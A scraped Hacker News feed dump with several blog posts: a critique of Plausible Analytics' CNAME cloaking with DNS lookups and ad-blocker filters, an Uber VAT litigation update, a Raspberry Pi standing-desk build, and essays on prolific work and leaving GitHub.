October 23, 2020 | https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking | <a href="https://web.archive.org/web/*/https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>
            </description>
            <link>https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868012</guid>
            <pubDate>Fri, 23 Oct 2020 10:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Law Project Forces HMRC to Collect £1.5bn in VAT from Uber]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24867410">thread link</a>) | @davidgerard
<br/>
October 23, 2020 | https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/ | <a href="https://web.archive.org/web/*/https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
            

            <div id="page">
                <p><span>Way back in April 2017, we announced we were going to take on HMRC’s</span> <a href="https://rebrand.ly/data-parliament-2017">failure to assess</a> <span>Uber to VAT which corroded public trust, not only in HMRC, but in politics more generally.Â&nbsp;</span></p>
<p><span>And itâ€™s been quite the scrap…Â&nbsp;</span></p>
<p><span>There have been lows – like us spending the money we raised in the crowdfunder trying to get a protective costs order and failing.Â&nbsp;</span></p>
<p><span>And there have been highs – like us persuading the High Court </span><a href="https://rebrand.ly/ewhc-2019"><span>late last year</span></a><span> that a fairly spineless HMRC was allowed to do what the legislation plainly allowed it to do and tell us it had (at last) assessed Uber.</span></p>
<p><span>There have been further lows – as last week when the Court of Appeal refused us permission to bring our judicial review against HMRC.</span></p>
<p><span><span>But ultimately </span><span>we triumphed</span><span>. </span></span><a href="https://rebrand.ly/ussec-10q"><span>Uber’s US accounts</span></a><span> now confirm that HMRC has assessed Uber to VAT on fares – both prospectively and retrospectively.</span></p>
<p><span>And thatâ€™s all we ever wanted.Â&nbsp;</span></p>
<p><span><span>It’s been a long, bumpy (and expensive) ride – if you’ll allow me the metaphor – but we have reached our destination. I am so proud that together we have forced HMRC, belatedly, to act – </span><span>Uber has now been asked to pay the Â£1.5bn of tax they owe the public purse.</span></span></p>
<p><span>We couldnâ€™t have done it without your support. So thank you.</span></p>
<p><span>Iâ€™d also like to thank the lawyers – George Peretz QC, Jack Anderson, Hui Ling McCarthy QC, Christopher Knight, David Greene, Vikram Sachdeva QC, and Alex Rook – who helped out, most for even less than the smell of an oily rag, along the way.</span></p>
<hr>
<p><span>It is only with your support that we can continue to hold Government to account. If you would like to make a donation, you can do so</span>Â&nbsp;<a href="https://goodlawproject.org/membership">here</a>.</p>
            </div>
        </div>

        
    </div></div>]]>
            </description>
            <link>https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867410</guid>
            <pubDate>Fri, 23 Oct 2020 09:10:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Home Made Raspberry Pi Standing Desk Controller]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24867077">thread link</a>) | @tomahony
<br/>
October 23, 2020 | https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller | <a href="https://web.archive.org/web/*/https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p><time title="14 days, 16 hours, and 35 minutes ago." datetime="2020-10-11T11:14:00+01:00">Sunday 11 October 2020</time></p><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03717.jpg?mtime=20201011123730&amp;focal=none" alt="DSC03717" title="DSC03717" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03717.jpg?mtime=20201011123730&amp;focal=none"></figure></div></section><section><div><p>I have a <a href="https://www.conset.com/Product/prod/4333/501-49" target="_blank" rel="noreferrer noopener">Conset 501-49</a> sit/stand desk at home. It's a decent, solid work desk but the default controller that it came with is poor, only allowing you to raise and lower via a set of small push-buttons. This makes it tedious to find the correct height and means you usually just don't bother getting up and standing, making it a rather expensive sit-only-desk.</p><p>Over the lockdown, I decided to improve this by replacing the original buttons with a Raspberry Pi powered controller that would allow me to raise and lower my desk at the click of a single button.<br></p></div></section><section><p>Here's a closer look at it sitting under my desk:</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03725.jpg?mtime=20201011123934&amp;focal=none" alt="DSC03725" title="DSC03725" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03725.jpg?mtime=20201011123934&amp;focal=none"></figure></div></section><section><div><p>This is <a href="https://shop.pimoroni.com/products/display-o-tron-hat" target="_blank" rel="noreferrer noopener">a DisplayOTron HAT that I bought from Pimoroni</a> a few years ago and never had a proper use for. Thankfully this hat is perfect for this project.</p><ul><li>On the <strong>front</strong> is a LCD display that shows the current height from the ground. This could be reprogrammed to show anything: animations, time standing or sitting, last time the desk was raised or lowered etc. <br></li><li>On the <strong>left</strong> of the display you'll see up/down capacitive buttons. These are programmed to allow me to manually raise or lower the desk, just like the original buttons. <br></li><li>Along the <strong>bottom</strong> are the preset buttons. Hitting the left arrow lowers the desk to my pre-programmed "ground" setting where it's comfortable for me to sit (around 60cm off the ground) while right arrow button raises it to my preset standing position (120cm).</li><li>Along the <strong>right</strong> there's a light-bar. This is really just a decoration, showing the current position of the desk. They light-up individually as the desk goes up. Like a 1-dimensional Christmas tree.<br></li></ul></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03731.f1602436285.jpg?mtime=20201011125310&amp;focal=none" alt="DSC03731" title="DSC03731" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03731.f1602436285.jpg?mtime=20201011125310&amp;focal=none"><figcaption>
													Superglue, picture hooks and velcro sticky things
																	</figcaption></figure></div></section><section></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_5056.gif?mtime=20201011125820&amp;focal=none" alt="IMG 5056" title="IMG 5056"></figure></div></section><section><div><p>So how does it work?<br></p><p>The relays on the Raspberry Pi allow us to control the underlying electrical circuit to raise/lower the desk via the RPIO's GPIO pins.</p><p>The height sensor detects how high the desk is currently off the ground and allows us to start/stop the motor via the above relays. <br></p><p>Finally, the display allows us to control everything as well as display the current height of the desk.</p><p>There were a few general stages to getting this working:</p><ol><li>Figuring out how the existing switches and motor work.<br></li><li>Replacing the default physical switches with relays.</li><li>Adding the height-sensor.</li><li>Programming everything together.</li></ol><h2>Figuring it Out</h2></div></section><section><p>Admission: I don't know what I'm doing - electricity is magic that spews from the wall, so a lot of this was just me poking an prodding at things while making sure I didn't electrocute myself. Be careful.</p></section><section><div><p>Here's what I knew: my desk had a big black motor sitting underneath. It raised and lowered the table. There were a few wires coming out of it connected to its build-in switch.<br></p><p>To learn more, the first thing I did was open (and effectively destroy) the default switch, to see how it worked inside<br></p></div></section><section><p>Top Tip: destroy things as early as possible so that <em>you have to</em> finish the project</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4424.jpg?mtime=20201011134639&amp;focal=none" alt="IMG 4424" title="IMG 4424" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4424.jpg?mtime=20201011134639&amp;focal=none"></figure></div></section><section><div><p>At a basic level it's easy to understand what <a href="https://uk.rs-online.com/web/p/microswitches/2900479/" target="_blank" rel="noreferrer noopener">these switches</a> do: they control how electricity flows to the motor. The circuit is open by default with no electricity flowing. When you press a button, it closes the circuit allowing electricity to flow to the motor which will rise or fall. Which direction the motor runs depends on whether you connect live or neural <sup>[citation needed]</sup><br></p><p>To be able to actually re-wire this though and hook everything up the relays, you need to actually understand it working in more detail. To do this, I cut the switches out (after taking a number of inadequate pictures) and created my own battery-powered circuit to see it in action.</p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4445.f1602436934.jpg?mtime=20201011135726&amp;focal=none" alt="IMG 4445" title="IMG 4445" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4445.f1602436934.jpg?mtime=20201011135726&amp;focal=none"><figcaption>
													It's a mess, but this circuit actually mimics the desk. There are two leds on the breadboard. These lighting up represent the desk raising or lowering.
																	</figcaption></figure></div></section><section><p>If I'm honest, I don't understand this stuff well enough to offer an explanation of exactly how you should do this or how it works in any detail. I did map it all out myself:</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-10-11-at-14.26.30.png?mtime=20201011142704&amp;focal=none" alt="Screenshot 2020 10 11 at 14 26 30" title="Screenshot 2020 10 11 at 14 26 30" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-10-11-at-14.26.30.png?mtime=20201011142704&amp;focal=none"></figure></div></section><section><p>But this might be wrong as I did a lot of reconnecting-wires-until-it-worked, so if you're doing something similar, spend some time researching relays and playing with a test circuit yourself before working with anything connected to the mains.<br></p></section><section><div><h2>Adding the Relays</h2><p>With a better idea of how the switches worked, I was able to add the relay board to the Raspberry Pi and test out the circuit before actually hooking it up to the motor.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4443.f1602422691.jpg?mtime=20201011142401&amp;focal=none" alt="IMG 4443" title="IMG 4443" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4443.f1602422691.jpg?mtime=20201011142401&amp;focal=none"><figcaption>
													Again, here "red" means the desk is rising, "green" means the desk is lowering ... or the other way around, I can't remember
																	</figcaption></figure></div></section><section><p>Finally, with that working, I went on to wire the actual motor up to the Raspberry Pi. Again, this is potentially dangerous. If you're doing this make sure you read-up on it and take some precautions (like cowering in the corner while you flip the switch with a long stick).<br></p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4448.jpg?mtime=20201011123943&amp;focal=none" alt="IMG 4448" title="IMG 4448" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4448.jpg?mtime=20201011123943&amp;focal=none"></figure></div></section><section><p>
		With everything wired up correctly I could now control both an "up" relay and "down" relay via code.
	</p></section><section><div><h2>Height Sensors</h2><p>With the ability to raise and lower the desk via the relays (and code), I needed to think about how to actually control the desk and get it into a comfortable standing or sitting position automatically.</p><p>One easy approach is to simply raise or lower the desk for a certain amount of time. In other words, to get into the "standing" position just enable the "up" relay for 5 seconds. To go back to "sitting" enable the "down" relay for 5 seconds.</p><p>This doesn't really work though. The desk lowers much more quickly than it raises (due to gravity) so it's very hard to get the correct timings. Furthermore you can easily get out-of-sync, meaning you have to manually adjust the height again, making the whole endeavour pointless (of course I only realised this once I had assembled everything).</p><p>A better approach is to use a height sensor. These are small little devices that send out a sound wave and measure how long it takes to return. With some simple maths you have the height of the ground.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none" alt="IMG 4499" title="IMG 4499" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none"><figcaption>
													The height sensor is the little E.T.-looking device in the top right.
																	</figcaption></figure></div></section><section><p>I found a <a href="https://thepihut.com/blogs/raspberry-pi-tutorials/hc-sr04-ultrasonic-range-sensor-on-the-raspberry-pi" target="_blank" rel="noreferrer noopener">few</a><a href="https://pimylifeup.com/raspberry-pi-distance-sensor/" target="_blank" rel="noreferrer noopener">tutorials</a> on setting this up via a small circuit on the breadboard. With some experimentation it was easy to start reading the desk height via Python.<br></p></section><section><div><h2>The Code</h2><p>With all the hardware in place, the final thing was to tie everything together with some Python.</p></div></section><section></section><section><div><p>I don't have much experience programming hardware or embedded devices so I had to tinker with this to get it working. <br></p><p>I ended up using Redis to create a message queue that each part of the controller could communicate through and then using threads to handle most of the various parts of the controller:</p><ul><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/buttons.py" target="_blank" rel="noreferrer noopener">Buttons</a><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/lightbar.py" target="_blank" rel="noreferrer noopener"></a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/lightbar.py" target="_blank" rel="noreferrer noopener">Lightbar</a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/display.py" target="_blank" rel="noreferrer noopener">Display</a><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/relay.py" target="_blank" rel="noreferrer noopener"></a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/relay.py" target="_blank" rel="noreferrer noopener">Relays</a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/distance.py" target="_blank" rel="noreferrer noopener">Height sensor</a></li></ul><h2>Bonus: Apple Home via Homebridge</h2><p>As an added bonus I also<a href="https://homebridge.io/" target="_blank" rel="noreferrer noopener"> installed Homebridge on the Raspberry Pi</a>, allowing me to control the standing desk via my iPhone/Mac/iPad.</p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-08-30-at-15.26.06.png?mtime=20201011185906&amp;focal=none" alt="Screenshot 2020 08 30 at 15 26 06" title="Screenshot 2020 08 30 at 15 26 06" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-08-30-at-15.26.06.png?mtime=20201011185906&amp;focal=none"></figure></div></section><section><p>To do this I needed to create a plugin for homebridge. You can also see <a href="https://github.com/timmyomahony/homebridge-standing-desk" target="_blank" rel="noreferrer noopener">the code for this on my Github page</a>. I don't actually use this that much to control the desk, but it's a nice added bonus.</p></section><section></section></article></div></div>]]>
            </description>
            <link>https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867077</guid>
            <pubDate>Fri, 23 Oct 2020 08:05:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Be prolific]]>
            </title>
            <description>
<![CDATA[
Score 306 | Comments 125 (<a href="https://news.ycombinator.com/item?id=24866706">thread link</a>) | @hecticjeff
<br/>
October 22, 2020 | https://www.chrismytton.com/be-prolific/? | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/be-prolific/?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

    </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/be-prolific/?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866706</guid>
            <pubDate>Fri, 23 Oct 2020 06:56:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important Open Source projects should not use GitHub]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24866580">thread link</a>) | @stargrave
<br/>
October 22, 2020 | https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html | <a href="https://web.archive.org/web/*/https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>
<ul>
<li><a href="https://codeberg.org/">Codeberg</a><br>Codeberg is a registered German non-profit organization and I think it is the best alternative. Codeberg does not depend on external services. No third party cookies, no tracking. Hosted in the EU.<br>Relevant discussion on <a href="https://news.ycombinator.com/item?id=22795930">Hacker News</a>. Relevant <a href="https://codeberg.org/codeberg/org/src/branch/master/PrivacyPolicy.md">Privacy Policy</a></li>
<li><a href="https://notabug.org/">NotABug</a><br>NotABug.org is run by <a href="https://peers.community/">Peers</a>, a group of people interested in free software and free society. It is mostly for small projects though. Relevant <a href="https://notabug.org/tos">Privacy Policy</a>.</li>
<li><a href="https://sourcehut.org/">sourcehut</a><br>sourcehut is currently considered alpha and it is not going to stay free, but it does not have any tracking or advertising. All features work without JavaScript. Relevant <a href="https://man.sr.ht/privacy.md">Privacy Policy</a>. Relevant discussion on <a href="https://news.ycombinator.com/item?id=23030489">Hacker News</a>. After signing up you get the following message: <q>Payment is optional during the alpha, but be aware that it will become mandatory later. This service is funded by its users, not by investors.</q></li>
</ul>
<p>A few good solutions for self-hosting (not an exhaustive list):</p>
<ul>
<li><a href="https://gogs.io/">Gogs</a> - old discussion at <a href="https://news.ycombinator.com/item?id=11374003">Hacker News</a></li>
<li><a href="https://gitea.io/en-US/">Gitea</a> a community-managed fork of Gogs - discussed at <a href="https://news.ycombinator.com/item?id=17006503">Hacker News</a></li>
<li><a href="https://github.com/theonedev/onedev">OneDev</a> - discussed at <a href="https://news.ycombinator.com/item?id=22081419">Hacker News</a></li>
</ul>
</article></div>]]>
            </description>
            <link>https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866580</guid>
            <pubDate>Fri, 23 Oct 2020 06:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egypt Blocks Access to Telegram]]>
            </title>
            <description>
<![CDATA[
Score 153 | Comments 73 (<a href="https://news.ycombinator.com/item?id=24865875">thread link</a>) | @emptysongglass
<br/>
October 22, 2020 | https://masaar.net/en/the-egyptian-authorities-block-telegram/ | <a href="https://web.archive.org/web/*/https://masaar.net/en/the-egyptian-authorities-block-telegram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3127" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
